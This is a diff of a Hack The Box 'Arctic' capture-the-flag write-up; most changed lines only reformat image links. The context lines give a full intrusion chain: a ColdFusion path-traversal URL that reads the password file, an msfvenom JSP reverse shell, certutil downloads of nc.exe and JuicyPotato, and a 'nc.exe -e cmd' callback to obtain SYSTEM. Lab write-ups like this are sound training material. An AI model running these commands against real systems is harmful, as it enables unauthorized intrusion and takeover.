@@ -38,7 +38,7 @@ Verify if the host is alive using ICMP:
 ping -c 1 10.10.10.11
 ```
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/ping.png]]
+![Ping](screenshots/ping.png)  
 
 The host responds, confirming it is reachable.
 
@@ -58,14 +58,14 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/allports.png]]
+![Nmap all ports](screenshots/allports.png)  
 
 Extract open ports from the result:
 
 ```bash
 extractPorts allPorts
 ```
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/extractports.png]]
+![ExtractPorts](screenshots/extractports.png)  
 
 ---
 ### 1.3 Targeted Scan
@@ -86,7 +86,7 @@ Let's check the result:
 cat targeted -l java
 ```
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/targeted.png]]
+![Targeted Scan](screenshots/targeted.png)  
 
 **Findings:**
 
@@ -101,25 +101,25 @@ cat targeted -l java
 
 Navigating to `http://10.10.10.11:8500` reveals the **ColdFusion web interface**:
 
-![[web_port_8500.png]]
+![Web port 8500](screenshots/web_port_8500.png)  
 
 Deeper exploration shows the `CFIDE` directory:
 
-![[web_8500_CFIDE.png]]
+![CFIDE directory](screenshots/web_8500_CFIDE.png)  
 
 Key findings:
 - The **administrator** directory is exposed  
 - Pages use the `.cfm` extension (ColdFusion Markup)
 
-![[web_8500_CFIDE_administrator.png]]
+![Administrator login page](screenshots/web_8500_CFIDE_administrator.png)  
 
 Testing authentication with random credentials shows encrypted values in the textbox: 
 
-![[web_password_encrypted.png]]  
+![Encrypted password field](screenshots/web_password_encrypted.png)  
 
 The encrypted values might represent a hash. We can reveal them by changing the HTML input type from `password` to `text` in the inspection view, allowing us to see the stored password hash:
 
-![[inspection_password_to_type.png]]  
+![Inspection changing input type](screenshots/inspection_password_to_type.png)  
 
 This hash is not recognized by CrackStation, and after several attempts with Hashcat and John, it does not appear to correspond to a valid password.
 
@@ -134,7 +134,7 @@ Search for ColdFusion vulnerabilities:
 searchsploit adobe coldfusion
 ```
 
-![[searchsploit_coldfusion.png]]
+![Searchsploit ColdFusion](screenshots/searchsploit_coldfusion.png)  
 
 The most promising is a **Directory Traversal** exploit:
 
@@ -142,7 +142,7 @@ The most promising is a **Directory Traversal** exploit:
 searchsploit -x multiple/remote/14641.py
 ```
 
-![[searchsploit_download_sploit.png]]
+![Exploit details](screenshots/searchsploit_download_sploit.png)  
 
 The vulnerability describes an LFI in the following path:
 
@@ -150,17 +150,17 @@ The vulnerability describes an LFI in the following path:
 http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en 
 ```
 
-![[web_port_8500_CFIDE_administrator_enter.png]]
+![LFI password.properties](screenshots/web_port_8500_CFIDE_administrator_enter.png)  
 
 This reveals the **password hash**, which is then cracked with CrackStation:  
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/crackstation.png]]
+![Cracked password](screenshots/crackstation.png)  
 
 Password `happyday` obtained.
 
 Login successful:  
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/web_login.png]]
+![Successful login](screenshots/web_login.png)  
 
 At this point, we know that we have **directory listing capabilities**, as we can access the `CFIDE` directory. This implies that, at the system level, there must be a corresponding filesystem path for this directory. If we can identify that path, we may be able to upload a malicious file into the system.
 
@@ -172,12 +172,12 @@ Among the various options available in the web interface, some are particularly 
 - **Mapping**  
     This section reveals system paths, and conveniently we can see the path for `CFIDE`, which originates from `wwwroot`:
 
-![[web_mapping.png]]  
+![Mappings panel](screenshots/web_mapping.png)  
 
 - **Scheduled Tasks**  
     Another interesting section is **Scheduled Tasks**, which allows us to configure jobs that can download files from an external source and place them into a specified directory on the server. This feature can be abused to upload a malicious payload to the system.:
 
-![[web_scheduled_tasks.png]]
+![Scheduled Tasks panel](screenshots/web_scheduled_tasks.png)  
 
 Currently, there are no tasks configured, but we can create one. This is particularly interesting because scheduled tasks will download the files we specify into a chosen directory. In other words, we can configure an exploit and let the scheduled task place it into the system.
 
@@ -188,7 +188,7 @@ msfvenom -l payloads | grep jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -o reverse.jsp
 ```
 
-![[msfvenom_payloads.png]]
+![MSFvenom payloads](screenshots/msfvenom_payloads.png)  
 
 Payload generated: `reverse.jsp`:
 
@@ -259,7 +259,7 @@ We configure a scheduled task to upload it to:
 C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp
 ```
 
-![[web_creating_a_task.png]]
+![Task creation](screenshots/web_creating_a_task.png)  
 
 Serve the file with Python:
 
@@ -267,19 +267,17 @@ Serve the file with Python:
 python3 -m http.server 80
 ```
 
-![[python_server_reverse.png]]
-
 Save and execute the task manually:  
 
-![[web_executing_task.png]]
+![Executing task](screenshots/web_executing_task.png)  
 
 Confirm the upload in our server:
 
-![[python_server_reverse.png]]
+![Python server](screenshots/python_server_reverse.png)  
 
 And in directory:
 
-![[web_port_8500_CFIDE_reverse_uploaded.png]]
+![Uploaded reverse.jsp](screenshots/web_port_8500_CFIDE_reverse_uploaded.png)  
 
 Start a listener and trigger the reverse shell:
 
@@ -289,7 +287,7 @@ nc -nlvp 443
 
 Clicking `reverse.jsp` spawns a shell.  
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/user_flag.png]]
+![User flag](screenshots/user_flag.png)  
 
 🏁 **User flag obtained**  
 
@@ -300,7 +298,7 @@ We are **tolis** user.
 
 Check tolis privileges:  
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/user_priv.png]]
+![User privileges](screenshots/user_priv.png)  
 
 The account has **SeImpersonatePrivilege**, exploitable with **JuicyPotato**.
 
@@ -311,7 +309,7 @@ certutil.exe -f -urlcache -split http://10.10.14.7:80/nc.exe
 certutil.exe -f -urlcache -split http://10.10.14.7:80/JP.exe
 ```
 
-![[uploading_nc_&_JP.png]]
+![Uploading nc & JP](screenshots/uploading_nc_and_JP.png)  
 
 Execution:
 
@@ -319,11 +317,11 @@ Execution:
 .\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.7 4646"
 ```
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/executing_JP.png]]
+![Executing JuicyPotato](screenshots/executing_JP.png)  
 
 We catch the connection on port 4646 and obtain SYSTEM:  
 
-![[GitHub Documentation/EASY/HTB_Arctic_Writeup/screenshots1/root_flag.png]]
+![Root flag](screenshots/root_flag.png)  
 
 🏁 **Root flag obtained**
 
